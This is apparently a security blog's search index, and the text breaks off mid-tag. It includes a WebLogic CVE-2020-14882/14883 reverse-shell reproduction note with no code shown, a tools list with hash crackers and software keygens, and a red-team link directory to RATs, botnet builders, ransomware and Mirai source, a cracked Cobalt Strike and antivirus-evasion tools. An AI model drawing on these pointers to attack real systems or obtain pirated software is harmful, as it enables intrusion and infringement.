<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>weblogic未授权命令执行反弹shell</title>
      <link href="2020/11/09/weblogic-wei-shou-quan-ming-ling-zhi-xing-fan-dan-shell/"/>
      <url>2020/11/09/weblogic-wei-shou-quan-ming-ling-zhi-xing-fan-dan-shell/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="0x01-漏洞详情"><a href="#0x01-漏洞详情" class="headerlink" title="0x01:漏洞详情"></a>0x01:漏洞详情</h1><blockquote><p>No.1: CVE-2020-14883: 权限绕过漏洞 </p><blockquote><p>远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console。</p></blockquote><p>No.2: CVE-2020-14882: 代码执行漏洞</p><blockquote><p>结合 CVE-2020-14883 漏洞，远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console ，并在 WebLogic Server Console 执行任意代码。</p></blockquote></blockquote><hr><hr><h1 id="0x02-复现环境："><a href="#0x02-复现环境：" class="headerlink" title="0x02:复现环境："></a>0x02:复现环境：</h1><hr><blockquote><p>linux :2.6.32</p><p>java version “1.6.0_45”<br>Java(TM) SE Runtime Environment (build 1.6.0_45-b06)<br>Java HotSpot(TM) 64-Bit Server VM (build 20.45-b01, mixed mode)</p><p>weblogic 10.3.6</p></blockquote><hr><h1 id="0x03-Expolit"><a href="#0x03-Expolit" class="headerlink" title="0x03:Expolit"></a>0x03:Expolit</h1><p><strong><em>成功反弹shell并提权</em></strong></p><blockquote><p>1.C2服务器开启web服务，搭建构造好的poc.xml，用于反弹shell或者行命令</p></blockquote><blockquote><p>2.利用漏洞加载Spring的 ClassPathXmlApplicationContext类访问我们的远程poc.xml</p><blockquote><p>ClassPathXmlApplicationContext的使用：<a href="https://blog.csdn.net/u012397322/article/details/87545950">https://blog.csdn.net/u012397322/article/details/87545950</a></p></blockquote></blockquote><p><img src="/images/cve-2020-14882/pocxml.png" alt="成功利用"></p><p>参考链接：</p><p>漏洞poc详情参考: <a href="https://github.com/jas502n/CVE-2020-14882">https://github.com/jas502n/CVE-2020-14882</a><br>ClassPathXmlApplicationContext类：<br><a href="https://blog.csdn.net/u012397322/article/details/87545950">https://blog.csdn.net/u012397322/article/details/87545950</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weblogic </tag>
            
            <tag> CVE-2020-14882，CVE-2020-14883 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tools-Online</title>
      <link href="2020/10/09/tools-online/"/>
      <url>2020/10/09/tools-online/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="在线自服务与工具"><a href="#在线自服务与工具" class="headerlink" title="在线自服务与工具"></a><strong>在线自服务与工具</strong></h2><blockquote><p><a href="https://github.com/Kickball/awesome-selfhosted">https://github.com/Kickball/awesome-selfhosted</a> awesome系列之自服务应用<br><br><a href="https://github.com/littlecodersh/itchat">https://github.com/littlecodersh/itchat</a> 微信个人号接口、微信机器人及命令行微信<br><br><a href="https://github.com/sym233/core-values-encoder">https://github.com/sym233/core-values-encoder</a> js,社会主义核心价值观加密，<br><a href="https://sym233.github.io/core-values-encoder/">https://sym233.github.io/core-values-encoder/</a><br><br><a href="https://github.com/valentinxxx/nginxconfig.io/">https://github.com/valentinxxx/nginxconfig.io/</a> 在线nginx配置文件生成，demo网址<br><a href="https://nginxconfig.io/">https://nginxconfig.io</a><br><br><a href="https://github.com/asciimoo/searx">https://github.com/asciimoo/searx</a> 搭建一个自己的搜索引擎,DEMO网址<br><a href="https://searx.me/">https://searx.me/</a><br><br><a href="http://sc.ftqq.com/3.version">http://sc.ftqq.com/3.version</a> server酱微信通知<br><br><a href="https://osint.link/">https://osint.link</a> Open Source Intelligence (OSINT) Tools &amp; Resources<br><br><a href="https://www.wolframalpha.com/">https://www.wolframalpha.com</a> 根据问题直接给出答案的网站<br>shodan.io 互联网感知引擎<br>fofa.so 白帽汇NOSEC<br><br><a href="https://www.oshadan.com/">https://www.oshadan.com</a> 傻蛋联网设备搜索_湖南安数网络<br>zoomeye.org 知道创宇互联网感知引擎<br><br><a href="https://sms.cngrok.com/receiving-sms">https://sms.cngrok.com/receiving-sms</a> 收码接码<br><br><a href="https://www.pdflibr.com/">https://www.pdflibr.com/</a> 收码接码<br><br><a href="https://www.fakenamegenerator.com/">https://www.fakenamegenerator.com</a> 多国身份信息模拟器<br><br><a href="https://recruitin.net/">https://recruitin.net</a> Easily use Google to search profiles on LinkedIn<br><br><a href="https://www.truthfinder.com/">https://www.truthfinder.com</a> 美国公民信息查询<br><br><a href="https://verify-email.org/">https://verify-email.org</a> 邮件真实性验证<br><br><a href="https://safeweb.norton.com/">https://safeweb.norton.com</a> 诺顿网站安全检测<br><br><a href="http://www.vuln.cn/tools/ftp">http://www.vuln.cn/tools/ftp</a> 在线FTP登录<br><br><a href="http://www.link114.cn/title/">http://www.link114.cn/title/</a> 批量查询网站标题<br><br><a href="https://www.whatweb.net/">https://www.whatweb.net/</a> 在线web指纹识别<br><br><a href="https://hackertarget.com/ip-tools/">https://hackertarget.com/ip-tools/</a> 提供api，ip相关工具、在线扫描器<br><br><a href="http://www.webscan.cc/">http://www.webscan.cc/</a> 同IP网站查询,C段查询,IP反查域名,C段旁注,旁注工具<br><br><a href="https://www.phpinfo.me/bing.php">https://www.phpinfo.me/bing.php</a> 在线旁站查询|C段查询|必应接口C段查询<br><br><a href="https://www.phpinfo.me/domain/">https://www.phpinfo.me/domain/</a> 在线子域名爆破<br><br><a href="https://www.dnsdb.io/">https://www.dnsdb.io</a> DNS查询,子域名查询,IP查询,A记录查询,域名解析,旁站查询<br><br><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> dns recon and research, find and lookup dns records<br><br><a href="http://ip.chaxun.la/">http://ip.chaxun.la/</a> ip反查域名—查询啦<br><br><a href="https://habo.qq.com/">https://habo.qq.com</a> 在线恶意文件检测<br><br><a href="https://www.virustotal.com/">https://www.virustotal.com</a> 恶意软件检测<br><br><a href="http://r.virscan.org/">http://r.virscan.org/</a> 恶意软件检测<br><br><a href="https://www.appscan.io/">https://www.appscan.io</a> 移动软件在线检测<br><br><a href="https://www.nomoreransom.org/">https://www.nomoreransom.org</a> 常见勒索软件分析还原<br><br><a href="https://www.cmd5.com/">https://www.cmd5.com/</a> HASH密码在线破解<br><br><a href="https://www.onlinehashcrack.com/">https://www.onlinehashcrack.com</a> 密码哈希在线破解，邮件通知</p></blockquote><h2 id="在线办公套件"><a href="#在线办公套件" class="headerlink" title="在线办公套件"></a><strong>在线办公套件</strong></h2><blockquote><p><a href="https://sadd.io/">https://sadd.io/</a> 在线操作系统<br><br><a href="https://github.com/zyx0814/dzzoffice">https://github.com/zyx0814/dzzoffice</a> 在线办公套件,DEMO网址demo.dzzoffice.com<br><br><a href="https://github.com/RobbieHan/gistandard">https://github.com/RobbieHan/gistandard</a> py，基于Django，OA工单办公管理系统<br><br><a href="https://github.com/pavanw3b/sh00t">https://github.com/pavanw3b/sh00t</a> PY3,DJANGO，安全测试工单管理<br><br><a href="https://github.com/chaitin/strapdown-zeta">https://github.com/chaitin/strapdown-zeta</a> 基于strapdown.js，长亭二次开发开源的Wiki系统，支持markdown<br><br><a href="https://etherpad.net/">https://etherpad.net/</a> 在线可编辑记事本<br><br><a href="https://www.upload.ee/">https://www.upload.ee/</a> 文件共享平台<br><br><a href="https://github.com/micahflee/onionshare">https://github.com/micahflee/onionshare</a> 利用onion洋葱服务器匿名文件共享<br><br><a href="https://github.com/filebrowser/filebrowser">https://github.com/filebrowser/filebrowser</a> GO,基于Caddy框架的网盘<br><br><a href="https://github.com/nextcloud/server">https://github.com/nextcloud/server</a> php，私有云网盘，owncloud分支<br><br><a href="https://github.com/owncloud/core">https://github.com/owncloud/core</a> php，私有云网盘，界面不美观<br><br><a href="https://github.com/haiwen/seafile">https://github.com/haiwen/seafile</a> C,私有云网盘，速度快，功能少<br><br><a href="https://github.com/ymfe/yapi">https://github.com/ymfe/yapi</a> API管理工具<br><br><a href="https://thyrsi.com/">https://thyrsi.com/</a> 图片上传分享工具</p></blockquote><h2 id="隐私匿名加密"><a href="#隐私匿名加密" class="headerlink" title="隐私匿名加密"></a><strong>隐私匿名加密</strong></h2><blockquote><p><a href="https://www.lshack.cn/118/">https://www.lshack.cn/118/</a> 在线接收验证码/邮箱/粘贴板/文件传输大集合。<br><br><a href="http://bccto.me/">http://bccto.me</a> 一次性邮箱<br><br><a href="https://www.guerrillamail.com/">https://www.guerrillamail.com</a> 一次性邮箱<br><br><a href="http://24mail.chacuo.net/">http://24mail.chacuo.net/</a> 一次性邮箱<br><br><a href="http://www.yopmail.com/">http://www.yopmail.com</a> 一次性邮箱<br><br><a href="https://yandex.com/">https://yandex.com/</a> 非手机邮箱<br><br><a href="https://mail.ru/">https://mail.ru/</a> 非手机邮箱<br><br><a href="https://mail.protonmail.com/login">https://mail.protonmail.com/login</a> 非手机邮箱<br><br><a href="https://github.com/walkor/workerman-chat">https://github.com/walkor/workerman-chat</a> php，在线聊天室，可扩展<br><br><a href="https://github.com/hack-chat">https://github.com/hack-chat</a> <br><a href="https://hack.chat/?your-channel">https://hack.chat/?your-channel</a> js,在线聊天，问号后面跟你的房间名<br><br><a href="https://github.com/akaxincom/openzaly">https://github.com/akaxincom/openzaly</a> java,聊天室，Akaxin为客户端闭源<br><br><a href="https://github.com/RocketChat/Rocket.Chat">https://github.com/RocketChat/Rocket.Chat</a> js,在线团队聊天服务器，<br><a href="https://rocket.chat/install">https://rocket.chat/install</a><br><br><a href="https://telegram.org/">https://telegram.org</a><br><br><a href="https://www.whatsapp.com/">https://www.whatsapp.com</a><br><br><a href="https://wire.com/en">https://wire.com/en</a><br><br><a href="https://signal.org/">https://signal.org</a><br><br><a href="http://www.batmessenger.com/">http://www.batmessenger.com</a><br><br><a href="http://sid.co/">http://sid.co</a></p></blockquote><h2 id="在线资源"><a href="#在线资源" class="headerlink" title="在线资源"></a><strong>在线资源</strong></h2><blockquote><p><a href="https://github.com/DoubleLabyrinth/navicat-keygen">https://github.com/DoubleLabyrinth/navicat-keygen</a> navicat注册机<br><br><a href="https://github.com/DoubleLabyrinth/MobaXterm-keygen">https://github.com/DoubleLabyrinth/MobaXterm-keygen</a> MobaXterm注册机<br><br><a href="http://www.zdfans.com/">http://www.zdfans.com</a> zd423 - 软件分享平台领跑者<br><br><a href="https://www.flaticon.com/">https://www.flaticon.com</a> 免费图标网站<br><br><a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn</a> 原生镜像<br><br><a href="https://www.freenom.com/">https://www.freenom.com</a> 注册免费域名，dns解析<br><br><a href="https://codebeautify.org/">https://codebeautify.org</a> 在线代码美化<br><br><a href="http://patorjk.com/">http://patorjk.com</a> Text to ASCII Art Generator<br><br><a href="https://www.seopojie.com/">https://www.seopojie.com</a> SPAM,SEO</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TOOLS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红蓝资料集锦</title>
      <link href="2020/10/09/hong-lan-zi-liao-ji-jin/"/>
      <url>2020/10/09/hong-lan-zi-liao-ji-jin/</url>
      
        <content type="html"><![CDATA[<h1 id="项目简介"><a href="#项目简介" class="headerlink" title="项目简介"></a>项目简介</h1><p>一个 Red Team 攻击的生命周期，整个生命周期包括：</p><p>信息收集、攻击尝试获得权限、持久性控制、权限提升、网络信息收集、横向移动、数据分析（在这个基础上再做持久化控制）、在所有攻击结束之后清理并退出战场。<br>和一个著名的蓝队项目：<a href="https://github.com/meitar/awesome-cybersecurity-blueteam">https://github.com/meitar/awesome-cybersecurity-blueteam</a></p><hr><blockquote><p><a href="http://www.lshack.cn/774/">另一个专门扫描破解的项目</a></p></blockquote><hr><h2 id="相关资源列表"><a href="#相关资源列表" class="headerlink" title="相关资源列表"></a><strong>相关资源列表</strong></h2><blockquote><p><a href="https://mitre-attack.github.io/">https://mitre-attack.github.io/</a> mitre科技机构对攻击技术的总结wiki<br><br><a href="https://huntingday.github.io/">https://huntingday.github.io</a> MITRE | ATT&amp;CK 中文站<br><br><a href="https://arxiv.org/">https://arxiv.org</a> 康奈尔大学（Cornell University）开放文档<br><br><a href="http://www.owasp.org.cn/owasp-project/owasp-things">http://www.owasp.org.cn/owasp-project/owasp-things</a> OWASP项目<br><br><a href="http://www.irongeek.com/i.php?page=security/hackingillustrated">http://www.irongeek.com/i.php?page=security/hackingillustrated</a> 国内外安全大会相关视频与文档<br><br><a href="https://github.com/knownsec/KCon">https://github.com/knownsec/KCon</a> KCon大会文章PPT<br><br><a href="https://github.com/SecWiki/sec-chart">https://github.com/SecWiki/sec-chart</a> 各种相关安全思维导图集合<br><br><a href="https://github.com/knownsec/RD_Checklist">https://github.com/knownsec/RD_Checklist</a> 知道创宇技能列表<br><br><a href="https://github.com/ChrisLinn/greyhame-2017">https://github.com/ChrisLinn/greyhame-2017</a> 灰袍技能书2017版本<br><br><a href="https://github.com/Hack-with-Github/Awesome-Hacking">https://github.com/Hack-with-Github/Awesome-Hacking</a> GitHub万星推荐：黑客成长技术清单<br><br><a href="https://github.com/k4m4/movies-for-hackers">https://github.com/k4m4/movies-for-hackers</a> 安全相关电影<br><br><a href="https://github.com/jaredthecoder/awesome-vehicle-security">https://github.com/jaredthecoder/awesome-vehicle-security</a> 一个用于了解车辆安全和汽车黑客的资源清单<br><br><a href="https://www.jianshu.com/p/852e0fbe2f4c">https://www.jianshu.com/p/852e0fbe2f4c</a> 安全产品厂商分类<br><br><a href="https://www.reddit.com/r/Python/comments/a81mg3/the_entire_mit_intro_computer_science_class_using/">https://www.reddit.com/r/Python/comments/a81mg3/the_entire_mit_intro_computer_science_class_using/</a> 麻省理工机器学习视频<br><br><a href="https://github.com/fxsjy/jieba">https://github.com/fxsjy/jieba</a> py，结巴中文分词<br><br><a href="https://github.com/thunlp/THULAC-Python">https://github.com/thunlp/THULAC-Python</a> py，清华中文分词<br><br><a href="https://github.com/lancopku/PKUSeg-python">https://github.com/lancopku/PKUSeg-python</a> py3，北大中文分词<br><br><a href="https://github.com/fengdu78/Coursera-ML-AndrewNg-Notes">https://github.com/fengdu78/Coursera-ML-AndrewNg-Notes</a> 吴恩达机器学习python笔记<br><br><a href="https://paperswithcode.com/sota">https://paperswithcode.com/sota</a> 机器学习具体项目、演示、代码<br><br><a href="https://github.com/duoergun0729/nlp">https://github.com/duoergun0729/nlp</a> 一本开源的NLP（神经语言程序学）入门书籍<br><br><a href="https://www.freebuf.com/articles/web/195304.html">https://www.freebuf.com/articles/web/195304.html</a> 一句话木马的套路</p></blockquote><h2 id="攻防测试手册"><a href="#攻防测试手册" class="headerlink" title="攻防测试手册"></a><strong>攻防测试手册</strong></h2><blockquote><p><a href="https://micropoor.blogspot.com/2019/01/php8.html">https://micropoor.blogspot.com/2019/01/php8.html</a> PHP安全新闻早8点课程系列高持续渗透–Microporor<br><br><a href="https://github.com/Micropoor/Micro8">https://github.com/Micropoor/Micro8</a> Microporor高级攻防100课<br><br><a href="https://github.com/maskhed/Papers">https://github.com/maskhed/Papers</a> 包含100课等经典攻防教材、安全知识<br><br><a href="https://github.com/infosecn1nja/AD-Attack-Defense">https://github.com/infosecn1nja/AD-Attack-Defense</a> 红蓝方攻防手册<br><br><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a> 优秀红队资源列表<br><br><a href="https://github.com/foobarto/redteam-notebook">https://github.com/foobarto/redteam-notebook</a> 红队标准渗透测试流程+常用命令<br><br><a href="https://github.com/tom0li/collection-document">https://github.com/tom0li/collection-document</a> 文章收集：安全部、SDL、src、渗透测试、漏洞利用<br><br><a href="https://github.com/kbandla/APTnotes">https://github.com/kbandla/APTnotes</a> 各种公开的文件和相关的APT笔记，还有软件样本<br><br><a href="https://wizardforcel.gitbooks.io/web-hacking-101/content">https://wizardforcel.gitbooks.io/web-hacking-101/content</a> Web Hacking 101 中文版<br><br><a href="https://techvomit.net/web-application-penetration-testing-notes/">https://techvomit.net/web-application-penetration-testing-notes/</a> web渗透测试笔记<br><br><a href="https://github.com/qazbnm456/awesome-web-security">https://github.com/qazbnm456/awesome-web-security</a> Web安全资料和资源列表<br><br><a href="http://pentestmonkey.net/category/cheat-sheet">http://pentestmonkey.net/category/cheat-sheet</a> 渗透测试常见条目<br><br><a href="https://github.com/demonsec666/Security-Toolkit">https://github.com/demonsec666/Security-Toolkit</a> 渗透攻击链中常用工具及使用场景<br><br><a href="https://github.com/Kinimiwar/Penetration-Testing">https://github.com/Kinimiwar/Penetration-Testing</a> 渗透测试方向优秀资源收集<br><br><a href="https://github.com/jshaw87/Cheatsheets">https://github.com/jshaw87/Cheatsheets</a> 渗透测试/安全秘籍/笔记</p></blockquote><h2 id="内网安全文档"><a href="#内网安全文档" class="headerlink" title="内网安全文档"></a><strong>内网安全文档</strong></h2><blockquote><p><a href="https://attack.mitre.org/wiki/Lateral_Movement">https://attack.mitre.org/wiki/Lateral_Movement</a> mitre机构对横向移动的总结<br><br><a href="https://payloads.online/archivers/2018-11-30/1">https://payloads.online/archivers/2018-11-30/1</a> 彻底理解Windows认证 - 议题解读<br><br><a href="https://github.com/klionsec/klionsec.github.io">https://github.com/klionsec/klionsec.github.io</a> 内网大牛的学习历程<br><br><a href="https://github.com/l3m0n/pentest_study">https://github.com/l3m0n/pentest_study</a> 从零开始内网渗透学习<br><br><a href="https://github.com/Ridter/Intranet_Penetration_Tips">https://github.com/Ridter/Intranet_Penetration_Tips</a> 内网渗透TIPS</p></blockquote><h2 id="内网拓展后渗透"><a href="#内网拓展后渗透" class="headerlink" title="内网拓展后渗透"></a><strong>内网拓展后渗透</strong></h2><blockquote><p><a href="https://github.com/OpenWireSec/metasploit">https://github.com/OpenWireSec/metasploit</a> 后渗透框架<br><br><a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a> 基于poweshell的命令执行框架<br><br><a href="https://github.com/TheSecondSun/Bashark">https://github.com/TheSecondSun/Bashark</a> 纯Bash脚本编写的后渗透框架，大鲨鱼<br><br><a href="https://github.com/JusticeRage/FFM">https://github.com/JusticeRage/FFM</a> py3，拥有下载、上传功能，生成可执行py脚本的后门的后渗透框架<br><br><a href="https://github.com/DarkSpiritz/DarkSpiritz">https://github.com/DarkSpiritz/DarkSpiritz</a> py2,后渗透框架<br><br><a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a> 网络测试中的瑞士军刀，包含impacket、PowerSploit等多种模块<br><br><a href="https://github.com/SpiderLabs/scavenger">https://github.com/SpiderLabs/scavenger</a> 对CrackMapExec进行二次包装开发进行内网敏感信息扫描<br><br><a href="https://github.com/jmortega/python-pentesting">https://github.com/jmortega/python-pentesting</a> python-pentesting-tool python安全工具相关功能模块<br><br><a href="https://github.com/0xdea/tactical-exploitation">https://github.com/0xdea/tactical-exploitation</a> Python/PowerShell的测试脚本集<br><br><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a> powershell测试脚本集与开发框架汇总<br><br><a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a> powershell脚本集与利用框架<br><br><a href="https://github.com/PowerShellEmpire/PowerTools">https://github.com/PowerShellEmpire/PowerTools</a> PowerShell脚本集，停止更新<br><br><a href="https://github.com/FuzzySecurity/PowerShell-Suite">https://github.com/FuzzySecurity/PowerShell-Suite</a> PowerShell脚本集<br><br><a href="https://github.com/rvrsh3ll/Misc-Powershell-Scripts">https://github.com/rvrsh3ll/Misc-Powershell-Scripts</a> PowerShell脚本集<br><br><a href="https://github.com/nccgroup/redsnarf">https://github.com/nccgroup/redsnarf</a> 窃取哈希，密码解密，偷偷调用猕猴桃等程序，rdp多方法利用，远程启动shell，清楚痕迹<br><br><a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a> 用于分析域成员和用用户关系的程序，通过用powershell脚本导出域内的session、computer、group、user等信息，入库后进行可视化分析可以做到定点攻击。<br><br><a href="https://github.com/xorrior/RemoteRecon">https://github.com/xorrior/RemoteRecon</a> 利用DotNetToJScript进行截图、key记录、token窃取、dll与恶意代码注入<br><br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a> 利用浏览器漏洞当对方打开网址时，扫描对方内网信息<br><br><a href="https://github.com/fdiskyou/hunter">https://github.com/fdiskyou/hunter</a> 调用 Windows API 对内网信息进行搜集很全面<br><br><a href="https://github.com/0xwindows/VulScritp">https://github.com/0xwindows/VulScritp</a> 内网渗透脚本，包括banner扫描、端口扫描；phpmyadmin、jenkins等通用漏洞利用等<br><br><a href="https://github.com/lcatro/network_backdoor_scanner">https://github.com/lcatro/network_backdoor_scanner</a> 基于网络流量的内网探测框架<br><br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a> 详细的内部网络信息扫描器<br><br><a href="https://github.com/rootlabs/nWatch">https://github.com/rootlabs/nWatch</a> 联动nmap，并对组织内网进行扫描<br><br><a href="https://github.com/m8r0wn/nullinux">https://github.com/m8r0wn/nullinux</a> 用于Linux的内部渗透测试工具，可用于通过SMB枚举操作系统信息，域信息，共享，目录和用户。<br><br><a href="https://github.com/zMarch/Orc">https://github.com/zMarch/Orc</a> bash，Linux下后渗透命令集合</p></blockquote><h2 id="远控"><a href="#远控" class="headerlink" title="远控"></a><strong>远控</strong></h2><blockquote><p><a href="https://github.com/malwaredllc/byob">https://github.com/malwaredllc/byob</a> 僵尸网络生成框架<br><br><a href="https://github.com/proxycannon/proxycannon-ng">https://github.com/proxycannon/proxycannon-ng</a> 构建攻击僵尸网络<br><br><a href="https://github.com/deadPix3l/CryptSky/">https://github.com/deadPix3l/CryptSky/</a> 勒索软件poc<br><br><a href="https://github.com/jgamblin/Mirai-Source-Code">https://github.com/jgamblin/Mirai-Source-Code</a> 蠕虫病毒poc<br><br><a href="https://github.com/AhMyth/AhMyth-Android-RAT">https://github.com/AhMyth/AhMyth-Android-RAT</a> 基于smali，Windows下安卓远控，一对多带界面<br><br><a href="https://github.com/ssooking/cobaltstrike3.12_cracked">https://github.com/ssooking/cobaltstrike3.12_cracked</a> java1.8，远控、钓鱼、内网<br><br><a href="https://github.com/Mr-Un1k0d3r/ThunderShell">https://github.com/Mr-Un1k0d3r/ThunderShell</a> py2，CLI与web端，内存马，RC4加密HTTP传输<br><br><a href="https://github.com/tiagorlampert/CHAOS">https://github.com/tiagorlampert/CHAOS</a> go，win远控，可过大部分杀软<br><br><a href="https://github.com/Ne0nd0g/merlin">https://github.com/Ne0nd0g/merlin</a> go，c2通讯，一对多<br><br><a href="https://github.com/0x09AL/Browser-C2">https://github.com/0x09AL/Browser-C2</a> go，利用chrome以浏览器的形式连接C2服务器<br><br><a href="https://github.com/xdnice/PCShare">https://github.com/xdnice/PCShare</a> c++，可以监视目标机器屏幕、注册表、文件系统等<br><br><a href="https://github.com/quasar/QuasarRAT">https://github.com/quasar/QuasarRAT</a> c#，一对多，界面<br><br><a href="https://github.com/TheM4hd1/Vayne-RaT">https://github.com/TheM4hd1/Vayne-RaT</a> c#，一对多，界面<br><br><a href="https://github.com/nettitude/PoshC2">https://github.com/nettitude/PoshC2</a> PowerShell、C#，远控工具，有win提权组件<br><br><a href="https://github.com/euphrat1ca/njRAT-v0.7d">https://github.com/euphrat1ca/njRAT-v0.7d</a> vb，常见蠕虫远控，有很多变种，一对多带界面<br><br><a href="https://github.com/zerosum0x0/koadic">https://github.com/zerosum0x0/koadic</a> py3,利用JScript/VBScript 进行控制，大宝剑<br><br><a href="https://github.com/Ridter/MyJSRat">https://github.com/Ridter/MyJSRat</a> py2，利用js后门，配合chm、hta可实现很多后门方式。evi1cg.me/archives/chm_backdoor.html<br><br><a href="https://github.com/its-a-feature/Apfell">https://github.com/its-a-feature/Apfell</a> py3，macOS与linux下的利用js后门，web界面管理<br><br><a href="https://github.com/peterpt/fuzzbunch">https://github.com/peterpt/fuzzbunch</a> py2，NSA漏洞利用工具，配有自动化安装脚本与gui界面，远控rat<br><br><a href="https://github.com/n1nj4sec/pupy">https://github.com/n1nj4sec/pupy</a> py，Windows, Linux, OSX, Android跨平台，一对多<br><br><a href="https://github.com/nathanlopez/Stitch">https://github.com/nathanlopez/Stitch</a> py，Windows、Mac OSX、Linux跨平台<br><br><a href="https://github.com/neoneggplant/EggShell">https://github.com/neoneggplant/EggShell</a> py，macos/osx远控,可生成HID代码，一对多<br><br><a href="https://github.com/Marten4n6/EvilOSX">https://github.com/Marten4n6/EvilOSX</a> py，macos/osx远控，一对多<br><br><a href="https://github.com/vesche/basicRAT">https://github.com/vesche/basicRAT</a> py3，simple远控，一对多<br><br><a href="https://github.com/Viralmaniar/Powershell-RAT">https://github.com/Viralmaniar/Powershell-RAT</a> py，截图通过gmail传输<br><br><a href="https://github.com/byt3bl33d3r/gcat">https://github.com/byt3bl33d3r/gcat</a> py，使用 gmail 作为 C&amp;C 服务器<br><br><a href="https://github.com/sweetsoftware/Ares">https://github.com/sweetsoftware/Ares</a> py，c2通讯，支持代理<br><br><a href="https://github.com/micle-fm/Parat">https://github.com/micle-fm/Parat</a> py，利用telegram，windows下的远程控制工具<br><br><a href="https://github.com/ahhh/Reverse_DNS_Shell">https://github.com/ahhh/Reverse_DNS_Shell</a> py，通过dns传输<br><br><a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a> 服务端为ruby（linux），客户端为C（win/linux），利用DNS协议进行端对端传输<br><br><a href="https://github.com/deepzec/Grok-backdoor">https://github.com/deepzec/Grok-backdoor</a> py，利用ngrok的后门<br><br><a href="https://github.com/trustedsec/trevorc2">https://github.com/trustedsec/trevorc2</a> py，搭建一个合法的网站（可浏览），用于隐藏命令执行的客户端/服务器通信</p></blockquote><h2 id="后门免杀代码混淆"><a href="#后门免杀代码混淆" class="headerlink" title="后门免杀代码混淆"></a><strong>后门免杀代码混淆</strong></h2><blockquote><p><a href="https://www.shellterproject.com/">https://www.shellterproject.com</a> 杀毒软件绕过<br><br><a href="https://github.com/trustedsec/unicorn">https://github.com/trustedsec/unicorn</a> py，一键生成多种后门<br><br><a href="https://github.com/islamTaha12/Python-Rootkit">https://github.com/islamTaha12/Python-Rootkit</a> windows下rootkit，反弹meterpreter<br><br><a href="https://github.com/n00py/Hwacha">https://github.com/n00py/Hwacha</a> linux下快速生成metepreter等多种payload<br><br><a href="https://github.com/Screetsec/Vegile">https://github.com/Screetsec/Vegile</a> msf免杀，程序注入<br><br><a href="https://github.com/MohamedNourTN/Terminator">https://github.com/MohamedNourTN/Terminator</a> py2，msf免杀<br><br><a href="https://github.com/Veil-Framework/Veil">https://github.com/Veil-Framework/Veil</a> msf免杀<br><br><a href="https://github.com/abedalqaderswedan1/aswcrypter">https://github.com/abedalqaderswedan1/aswcrypter</a> py、bash，msf免杀<br><br><a href="https://github.com/Screetsec/TheFatRat">https://github.com/Screetsec/TheFatRat</a> java，msf免杀，利用searchsploit快速搜索<br><br><a href="https://github.com/pasahitz/zirikatu">https://github.com/pasahitz/zirikatu</a> msf免杀<br><br><a href="https://github.com/govolution/avet">https://github.com/govolution/avet</a> msf免杀<br><br><a href="https://github.com/GreatSCT/GreatSCT">https://github.com/GreatSCT/GreatSCT</a> msf免杀<br><br><a href="https://github.com/EgeBalci/HERCULES">https://github.com/EgeBalci/HERCULES</a> msf免杀<br><br><a href="https://github.com/trustedsec/nps_payload">https://github.com/trustedsec/nps_payload</a> msf免杀<br><br><a href="https://github.com/4w4k3/Insanity-Framework">https://github.com/4w4k3/Insanity-Framework</a> py，payload生成，过杀软，识别虚拟机，钓鱼，内存注入等<br><br><a href="https://github.com/hlldz/SpookFlare">https://github.com/hlldz/SpookFlare</a> Meterpreter，Empire，Koadic等loader/dropper的生成器，可以绕过客户端检测和网络端检测的端点策略<br><br><a href="https://github.com/pasahitz/regsvr32">https://github.com/pasahitz/regsvr32</a> 使用C#+Empire实现最小体积免杀后门<br><br><a href="https://github.com/malcomvetter/UnstoppableService">https://github.com/malcomvetter/UnstoppableService</a> 将自身安装为Windows服务且管理员无法停止/暂停服务的程序. C#编写<br><br><a href="https://github.com/Cn33liz/StarFighters">https://github.com/Cn33liz/StarFighters</a> 基于DotNetToJScript，利用JavaScript和VBScript执行Empire Launcher<br><br><a href="https://github.com/mdsecactivebreach/SharpShooter">https://github.com/mdsecactivebreach/SharpShooter</a> 基于DotNetToJScript使用js、vbs，用于检索和执行任意CSharp源码的payload创建框架<br><br><a href="https://github.com/mdsecactivebreach/CACTUSTORCH">https://github.com/mdsecactivebreach/CACTUSTORCH</a> 基于DotNetToJScript使用js、vbs生成恶意payload<br><br><a href="https://github.com/OmerYa/Invisi-Shell">https://github.com/OmerYa/Invisi-Shell</a> 对powershell文件进行混淆<br><br><a href="https://github.com/danielbohannon/Invoke-DOSfuscation">https://github.com/danielbohannon/Invoke-DOSfuscation</a> 对powershell文件进行混淆，加密操作以及重新编码<br><br><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a> 对powershell文件进行混淆，加密操作以及重新编码<br><br><a href="https://github.com/Mr-Un1k0d3r/SCT-obfuscator">https://github.com/Mr-Un1k0d3r/SCT-obfuscator</a> Cobalt Strike SCT有效载荷混淆器<br><br><a href="https://github.com/tokyoneon/Armor">https://github.com/tokyoneon/Armor</a> bash，生成加密 Payload 在 macOS 上反弹 Shell<br><br><a 